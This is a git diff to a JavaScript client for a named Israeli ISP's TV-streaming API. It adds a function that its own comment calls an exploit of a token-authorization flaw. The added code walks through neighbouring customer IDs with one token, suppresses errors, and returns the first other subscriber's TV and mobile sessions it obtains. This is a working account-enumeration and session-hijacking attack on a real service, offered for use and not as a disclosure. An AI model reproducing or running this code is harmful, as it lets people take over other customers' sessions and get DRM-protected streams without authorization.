@@ -90,7 +90,7 @@ export const getChannels = async ({ userId, token }) => {
     });
 };
 
-export const createSession = async (channelId, { userId, token }) => {
+export const createSession = async (channelId, { userId, token }, isForTv = false) => {
     const creationData = {
         CreateSession: [
             { ChannelId: channelId }
@@ -101,9 +101,7 @@ export const createSession = async (channelId, { userId, token }) => {
         method: 'POST',
         url: `https://pub.partner.co.il/traxis/web/Session/propset/all?CustomerId=${userId}&SeacToken=${token}&SeacClass=personal&Output=json`,
         data: creationData,
-        headers: {
-            'User-Agent': 'iFeelSmart-Android_MOBILE_AVC_L3',
-        }
+        ...(isForTv ? {} : {headers: {'User-Agent': 'iFeelSmart-Android_MOBILE_AVC_L3'}})
     };
 
     const drm = `https://sno.partner.co.il/WV/Proxy/DRM?AssetId=${channelId}&RequestType=1&DeviceUID=&RootStatus=false&DRMLevel=3&Roaming=false`;
@@ -117,5 +115,31 @@ export const createSession = async (channelId, { userId, token }) => {
         error.additionalData = {...err.response.data.Error};
 
         throw error;
+    }
+};
+
+// This exploits a vulnerability where the same token can be used to fetch any user's session
+export const createSessionForce = async (channelId, {userId: strUserId, token}) => {
+    const NUMBER_OF_TRIES = 50;
+    const TRIES_EACH_DIRECTION = NUMBER_OF_TRIES / 2;
+    const WAIT = 250;
+    const userId = parseInt(strUserId); 
+
+    for (let i = userId - TRIES_EACH_DIRECTION; i <= userId + TRIES_EACH_DIRECTION; i++) {
+        try {
+            const tvSession = createSession(channelId, {userId: i, token}, true);
+            const mobileSession = createSession(channelId, {userId: i, token});
+
+            const sessions = await Promise.all([tvSession, mobileSession]);
+            
+            console.log(sessions);
+
+            return sessions.map(x => ({...x, userId: i}));
+        } catch {
+            // Ignore this error
+        }
+         finally {
+            await new Promise(resolve => setTimeout(resolve, WAIT));
+        }
     }
 };
